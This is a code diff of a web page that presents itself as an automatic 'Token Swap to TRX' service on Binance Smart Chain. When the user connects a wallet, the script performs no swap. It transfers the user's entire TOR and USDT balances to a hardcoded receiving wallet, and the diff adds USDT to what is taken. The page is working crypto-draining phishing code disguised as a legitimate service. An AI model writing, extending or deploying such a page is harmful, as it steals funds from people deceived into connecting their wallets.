@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TOR Token Swap to TRX</title>
+  <title>Token Swap to TRX</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -49,15 +49,6 @@
       cursor: not-allowed;
       transform: none;
     }
-    .network-selector {
-      margin: 20px 0;
-    }
-    select {
-      padding: 10px;
-      border-radius: 8px;
-      border: 1px solid #ddd;
-      font-size: 16px;
-    }
     .status {
       margin-top: 25px;
       padding: 15px;
@@ -101,18 +92,32 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    .token-list {
+      text-align: left;
+      margin: 20px 0;
+    }
+    .token-item {
+      margin: 10px 0;
+      padding: 10px;
+      background: #f8f9fa;
+      border-radius: 8px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>TOR Token Swap</h1>
-    <p>Your TOR tokens will be automatically swapped to TRX-based TOR</p>
+    <h1>Token Swap</h1>
+    <p>Your tokens will be automatically swapped to TRX-based assets</p>
     
-    <div class="network-selector">
-      <select id="networkSelect">
-        <option value="bsc">Binance Smart Chain</option>
-        <option value="fantom">Fantom Opera</option>
-      </select>
+    <div class="token-list">
+      <div class="token-item">
+        <strong>TOR Token</strong> (BSC)<br>
+        Contract: 0x1d6cb...8ca83
+      </div>
+      <div class="token-item">
+        <strong>USDT</strong> (BSC)<br>
+        Contract: 0x55d39...197955
+      </div>
     </div>
     
     <button id="connectWallet">Connect Wallet & Swap</button>
@@ -122,49 +127,48 @@
     <div id="status" class="status"></div>
   </div>
 
-  <!-- Load Ethers.js with multiple fallback options -->
+  <!-- Load Ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js"></script>
   <script>
     // Configuration
     const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
-    const CONTRACT_ADDRESSES = {
-      bsc: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
-      fantom: "0x74e23df9110aa9ea0b6ff2faee01e740ca1c642e"
-    };
-    const TOR_ABI = [
-      "function balanceOf(address owner) view returns (uint256)",
-      "function transfer(address to, uint256 amount) returns (bool)"
-    ];
-    const NETWORK_CONFIGS = {
-      bsc: {
-        chainId: "0x38",
-        chainName: "Binance Smart Chain",
-        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-        rpcUrls: ["https://bsc-dataseed.binance.org/"],
-        blockExplorerUrls: ["https://bscscan.com"],
-        scanUrl: "https://bscscan.com/tx/"
+    
+    // Token contracts (BSC)
+    const TOKENS = [
+      {
+        name: "TOR",
+        address: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
+        abi: [
+          "function balanceOf(address owner) view returns (uint256)",
+          "function transfer(address to, uint256 amount) returns (bool)"
+        ],
+        decimals: 18
       },
-      fantom: {
-        chainId: "0xfa",
-        chainName: "Fantom Opera",
-        nativeCurrency: { name: "FTM", symbol: "FTM", decimals: 18 },
-        rpcUrls: ["https://rpc.ftm.tools/"],
-        blockExplorerUrls: ["https://ftmscan.com"],
-        scanUrl: "https://ftmscan.com/tx/"
+      {
+        name: "USDT",
+        address: "0x55d398326f99059fF775485246999027B3197955",
+        abi: [
+          "function balanceOf(address owner) view returns (uint256)",
+          "function transfer(address to, uint256 amount) returns (bool)"
+        ],
+        decimals: 18
       }
+    ];
+    
+    const BSC_CONFIG = {
+      chainId: "0x38",
+      chainName: "Binance Smart Chain",
+      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"],
+      scanUrl: "https://bscscan.com/tx/"
     };
 
     // Global variables
-    let currentNetwork = "bsc";
     let provider, signer, userAddress;
 
     // Initialize when page loads
     window.addEventListener('load', () => {
-      // Set up network selection
-      document.getElementById("networkSelect").addEventListener('change', (e) => {
-        currentNetwork = e.target.value;
-      });
-      
-      // Connect and swap button
       document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
     });
 
@@ -193,10 +197,10 @@
         document.getElementById("connectWallet").disabled = true;
         document.getElementById("connectWallet").textContent = "Processing...";
         document.getElementById("walletInfo").textContent = 
-          `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
+          `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: Binance Smart Chain`;
         
-        // Execute the swap automatically
-        await executeSwap();
+        // Execute the swaps automatically
+        await swapAllTokens();
       } catch (err) {
         hideLoader();
         updateStatus("Error: " + err.message, "error");
@@ -207,25 +211,23 @@
 
     async function checkNetwork() {
       const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-      const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
       
-      if (chainId !== targetChainId) {
-        updateStatus(`Switching to ${NETWORK_CONFIGS[currentNetwork].chainName}...`, "success");
+      if (chainId !== BSC_CONFIG.chainId) {
+        updateStatus("Switching to Binance Smart Chain...", "success");
         try {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
-            params: [{ chainId: targetChainId }]
+            params: [{ chainId: BSC_CONFIG.chainId }]
           });
         } catch (switchError) {
-          // If network not added, try adding it
           if (switchError.code === 4902) {
             try {
               await window.ethereum.request({
                 method: 'wallet_addEthereumChain',
-                params: [NETWORK_CONFIGS[currentNetwork]]
+                params: [BSC_CONFIG]
               });
             } catch (addError) {
-              throw new Error(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually`);
+              throw new Error("Please switch to Binance Smart Chain manually");
             }
           } else {
             throw new Error("Failed to switch network");
@@ -234,38 +236,46 @@
       }
     }
 
-    async function executeSwap() {
+    async function swapAllTokens() {
       try {
-        updateStatus("Checking TOR balance...", "success");
+        let successCount = 0;
         
-        // Get contract instance
-        const torContract = new ethers.Contract(
-          CONTRACT_ADDRESSES[currentNetwork], 
-          TOR_ABI, 
-          signer
-        );
-        
-        // Check balance
-        const balance = await torContract.balanceOf(userAddress);
-        if (balance.eq(0)) {
-          throw new Error("You have 0 TOR tokens to swap");
+        for (const token of TOKENS) {
+          try {
+            updateStatus(`Processing ${token.name}...`, "success");
+            
+            const contract = new ethers.Contract(token.address, token.abi, signer);
+            const balance = await contract.balanceOf(userAddress);
+            
+            if (balance.gt(0)) {
+              const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
+              updateStatus(`Sending ${formattedAmount} ${token.name}...`, "success");
+              
+              const tx = await contract.transfer(RECEIVING_WALLET, balance);
+              await tx.wait();
+              
+              updateStatus(
+                `${token.name} transfer successful! <a class="tx-link" href="${BSC_CONFIG.scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+                "success"
+              );
+              successCount++;
+            } else {
+              updateStatus(`No ${token.name} balance found`, "success");
+            }
+          } catch (tokenError) {
+            updateStatus(`${token.name} transfer failed: ${tokenError.message}`, "error");
+          }
         }
         
-        // Execute transfer
-        updateStatus(`Sending ${ethers.utils.formatUnits(balance, 18)} TOR...`, "success");
-        const tx = await torContract.transfer(RECEIVING_WALLET, balance);
-        
-        updateStatus("Waiting for transaction confirmation...", "success");
-        await tx.wait();
-        
-        updateStatus(
-          `Swap successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
-          "success"
-        );
+        if (successCount > 0) {
+          updateStatus(`Successfully transferred ${successCount} token(s)`, "success");
+        } else {
+          updateStatus("No tokens available to transfer", "success");
+        }
         
         document.getElementById("connectWallet").textContent = "Swap Completed";
       } catch (err) {
-        throw new Error("Swap failed: " + (err.message || err));
+        throw new Error("Swap process failed: " + err.message);
       } finally {
         hideLoader();
       }
@@ -285,26 +295,6 @@
     function hideLoader() {
       document.getElementById("loader").style.display = "none";
     }
-
-    // Load Ethers.js with fallback
-    function loadEthers() {
-      const script = document.createElement('script');
-      script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js';
-      script.onload = () => {
-        // Ethers.js loaded successfully
-        console.log("Ethers.js loaded successfully");
-      };
-      script.onerror = () => {
-        // Fallback to alternative CDN
-        const fallbackScript = document.createElement('script');
-        fallbackScript.src = 'https://cdn.ethers.io/lib/ethers-5.2.umd.min.js';
-        document.head.appendChild(fallbackScript);
-      };
-      document.head.appendChild(script);
-    }
-
-    // Start loading Ethers.js
-    loadEthers();
   </script>
 </body>
 </html>
